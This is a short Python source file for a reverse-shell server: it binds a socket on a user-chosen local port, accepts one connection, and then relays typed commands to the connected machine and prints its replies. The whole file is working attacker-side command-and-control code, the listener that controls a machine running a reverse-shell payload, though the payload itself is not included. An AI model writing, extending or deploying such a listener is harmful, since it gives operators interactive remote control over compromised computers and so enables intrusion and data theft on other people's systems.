# imported files
import os
import subprocess
import socket
import time

print("[+] ++++++++++++REVERSE SHELL SERVER ++++++++++++++++ [+]")
print("")
print("")

global sock
sock = socket.socket()

ip="127.0.0.1"
port=int(input("Enter the port no. here: "))

#this is the socket
def create_socket():
# creating a socket
    sock.bind((ip,port))
    print("[+] Binding IP and port is complete")
    time.sleep(1);
    print("[+]Being ready to listen please wait")
    time.sleep(1)


def listen():
    global connection
    sock.listen(1)
    print("[+]Listening for incoming connection request..................")

    connection,address=sock.accept()
    print("[+] Connected with:",address)
    data=connection.recv(1024).decode()
    print(data)

    send_command()

def send_command():
    while True:
        data=input()
        connection.send(data.encode())

        data_recv=connection.recv(1024).decode()
        print(data_recv)



create_socket()
listen()